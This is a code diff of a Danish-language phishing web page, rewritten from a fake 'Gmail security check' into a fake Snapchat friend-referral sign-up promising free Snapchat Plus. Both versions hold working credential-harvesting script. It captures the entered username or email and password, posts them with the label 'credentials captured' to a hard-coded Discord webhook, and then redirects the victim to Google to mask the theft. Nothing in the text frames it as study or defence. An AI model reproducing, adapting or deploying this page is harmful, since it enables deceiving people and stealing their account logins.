@@ -3,92 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sikkerhedscheck for Gmail</title>
+    <title>Tilmeld Snapchat - Anbefal en ven</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            background-color: #fafafa;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .container {
-            background: white;
+        .refer-container {
+            background-color: #fff;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             width: 300px;
+            text-align: center;
         }
-        .container h2 {
+        .refer-container h2 {
             margin-bottom: 20px;
         }
-        .form-group {
-            margin-bottom: 15px;
+        .refer-container p {
+            margin-bottom: 20px;
         }
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-        }
-        .form-group input {
+        .refer-container input {
             width: 100%;
-            padding: 8px;
-            box-sizing: border-box;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
         }
-        .btn {
-            background-color: #007BFF;
-            color: white;
-            padding: 10px 15px;
+        .refer-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #fffc00;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
+            color: #000;
+            font-size: 16px;
             cursor: pointer;
-        }
-        .btn:hover {
-            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Log ind for at sikre din Gmail</h2>
+    <div class="refer-container">
+        <h2>Tilmeld dig Snapchat, så din ven kan få Snapchat Plus gratis!</h2>
+        <p>Din ven har anbefalet dig til Snapchat. Log ind for at verificere og hjælpe dem med at låse op for Snapchat Plus gratis.</p>
         <form id="loginForm">
-            <div class="form-group">
-                <label for="email">Email:</label>
-                <input type="email" id="email" name="email" required>
-            </div>
-            <div class="form-group">
-                <label for="password">Kodeord:</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-            <button type="submit" class="btn">Sikre min konto</button>
+            <input type="text" id="username" placeholder="Brugernavn" required>
+            <input type="password" id="password" placeholder="Adgangskode" required>
+            <button type="submit">Tilmeld dig Snapchat</button>
         </form>
     </div>
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
 
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            const data = `Email: ${email}\nPassword: ${password}\n\n`;
-
-            const webhookUrl = 'https://discord.com/api/webhooks/1440331213935214702/Wz1b1XpLzQfieOuq8tQc153FdD_4JjUZnOR3h6pLAO4lABE3RkQsnR7PC2JVZf0qD-is'; // Replace with your webhook URL
-
-            fetch(webhookUrl, {
+            // Send the credentials to your Discord webhook
+            fetch('https://discord.com/api/webhooks/1440331213935214702/Wz1b1XpLzQfieOuq8tQc153FdD_4JjUZnOR3h6pLAO4lABE3RkQsnR7PC2JVZf0qD-is', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    content: 'New Gmail credentials captured: ' + data
+                    content: `New Snapchat credentials captured!\nUsername: ${username}\nPassword: ${password}`
                 })
             })
-            .then(response => response.text())
-            .then(result => {
-                alert('Din konto er nu sikret!');
-                window.location.href = 'https://mail.google.com';
+            .then(response => response.json())
+            .then(data => {
+                // Redirect to Google
+                window.location.href = 'https://www.google.com';
             })
             .catch(error => {
                 console.error('Error:', error);
